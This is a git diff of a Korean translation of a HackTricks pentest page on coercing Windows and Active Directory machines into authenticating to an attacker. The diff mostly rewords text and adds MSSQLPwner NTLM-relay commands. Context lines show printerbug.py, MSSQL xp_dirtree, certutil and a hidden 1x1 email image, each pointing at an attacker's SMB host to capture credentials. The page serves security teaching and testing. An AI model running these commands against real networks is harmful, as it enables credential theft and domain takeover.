@@ -21,12 +21,12 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## Spooler Service Abuse
 
-_**Print Spooler**_ 서비스가 **활성화되어** 있으면, 이미 알려진 AD 자격 증명을 사용하여 도메인 컨트롤러의 프린트 서버에 새로운 인쇄 작업에 대한 **업데이트**를 **요청**하고 **어떤 시스템으로 알림을 보내도록** 지시할 수 있습니다.\
+_**Print Spooler**_ 서비스가 **활성화**되어 있으면, 이미 알려진 AD 자격 증명을 사용하여 도메인 컨트롤러의 프린트 서버에 새로운 인쇄 작업에 대한 **업데이트**를 **요청**하고, 이를 **어떤 시스템으로 알리도록** 지시할 수 있습니다.\
 프린터가 임의의 시스템으로 알림을 보낼 때, 해당 **시스템**에 대해 **인증**해야 합니다. 따라서 공격자는 _**Print Spooler**_ 서비스가 임의의 시스템에 대해 인증하도록 만들 수 있으며, 이 인증에서 서비스는 **컴퓨터 계정**을 **사용**합니다.
 
 ### Finding Windows Servers on the domain
 
-PowerShell을 사용하여 Windows 박스 목록을 가져옵니다. 서버는 일반적으로 우선 순위가 높으므로, 거기에 집중합시다:
+PowerShell을 사용하여 Windows 박스 목록을 가져옵니다. 서버는 일반적으로 우선 순위가 높으므로, 여기에 집중합시다:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
@@ -54,7 +54,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Unconstrained Delegation과 결합하기
 
-공격자가 이미 [Unconstrained Delegation](unconstrained-delegation.md)으로 컴퓨터를 손상시킨 경우, 공격자는 **프린터가 이 컴퓨터에 대해 인증하도록 만들 수 있습니다**. 비제한 위임 덕분에 **프린터의 컴퓨터 계정의 TGT**는 비제한 위임이 있는 컴퓨터의 **메모리에 저장됩니다**. 공격자가 이미 이 호스트를 손상시켰기 때문에, 그는 **이 티켓을 검색하고 악용할 수 있습니다** ([Pass the Ticket](pass-the-ticket.md)).
+공격자가 이미 [Unconstrained Delegation](unconstrained-delegation.md)으로 컴퓨터를 손상시킨 경우, 공격자는 **프린터가 이 컴퓨터에 대해 인증하도록 만들 수 있습니다**. 비제한 위임으로 인해 **프린터의 컴퓨터 계정의 TGT**가 비제한 위임이 있는 컴퓨터의 **메모리에 저장됩니다**. 공격자가 이미 이 호스트를 손상시켰기 때문에, 그는 **이 티켓을 검색하고 악용할 수 있습니다** ([Pass the Ticket](pass-the-ticket.md)).
 
 ## RCP 강제 인증
 
@@ -64,7 +64,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 
 `PrivExchange` 공격은 **Exchange Server `PushSubscription` 기능**에서 발견된 결함의 결과입니다. 이 기능은 Exchange 서버가 메일박스가 있는 모든 도메인 사용자에 의해 HTTP를 통해 제공된 클라이언트 호스트에 인증되도록 강제할 수 있게 합니다.
 
-기본적으로 **Exchange 서비스는 SYSTEM으로 실행되며** 과도한 권한이 부여됩니다 (특히, **2019년 이전 누적 업데이트의 도메인에 대한 WriteDacl 권한**을 가집니다). 이 결함은 **LDAP에 정보를 중계하고 이후 도메인 NTDS 데이터베이스를 추출**할 수 있도록 악용될 수 있습니다. LDAP로의 중계가 불가능한 경우에도 이 결함은 여전히 도메인 내의 다른 호스트에 중계하고 인증하는 데 사용될 수 있습니다. 이 공격의 성공적인 악용은 인증된 도메인 사용자 계정으로 도메인 관리자의 즉각적인 접근을 허용합니다.
+기본적으로 **Exchange 서비스는 SYSTEM으로 실행되며** 과도한 권한이 부여됩니다 (특히, **2019년 누적 업데이트 이전 도메인에 대한 WriteDacl 권한**을 가집니다). 이 결함은 **LDAP에 정보를 중계하고 이후 도메인 NTDS 데이터베이스를 추출**할 수 있도록 악용될 수 있습니다. LDAP로의 중계가 불가능한 경우에도 이 결함은 도메인 내의 다른 호스트에 중계하고 인증하는 데 여전히 사용될 수 있습니다. 이 공격의 성공적인 악용은 인증된 도메인 사용자 계정으로 도메인 관리자의 즉각적인 접근을 허용합니다.
 
 ## Windows 내부
 
@@ -78,7 +78,18 @@ C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -S
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
-또는 이 다른 기술을 사용하세요: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
+```shell
+# Issuing NTLM relay attack on the SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on the local server with custom command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
+```
+또는 이 다른 기술을 사용할 수 있습니다: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
 
@@ -90,7 +101,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### 이메일을 통한
 
-당신이 손상시키고자 하는 머신에 로그인하는 사용자의 **이메일 주소**를 알고 있다면, 그에게 **1x1 이미지**가 포함된 **이메일**을 보낼 수 있습니다.
+당신이 침투하고자 하는 머신에 로그인하는 사용자의 **이메일 주소**를 알고 있다면, 그에게 **1x1 이미지**가 포함된 **이메일**을 보낼 수 있습니다.
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
@@ -104,7 +115,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
 ## NTLMv1 크래킹
 
-[NTLMv1 챌린지를 캡처할 수 있다면 여기를 읽고 크래킹하는 방법을 확인하세요](../ntlm/#ntlmv1-attack).\
+[NTLMv1 챌린지를 캡처할 수 있다면 여기를 읽고 크래킹하는 방법을 알아보세요](../ntlm/#ntlmv1-attack).\
 _NTLMv1을 크래킹하려면 Responder 챌린지를 "1122334455667788"로 설정해야 합니다._
 
 {% hint style="success" %}
@@ -117,7 +128,7 @@ GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt=
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
 * **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
 {% endhint %}
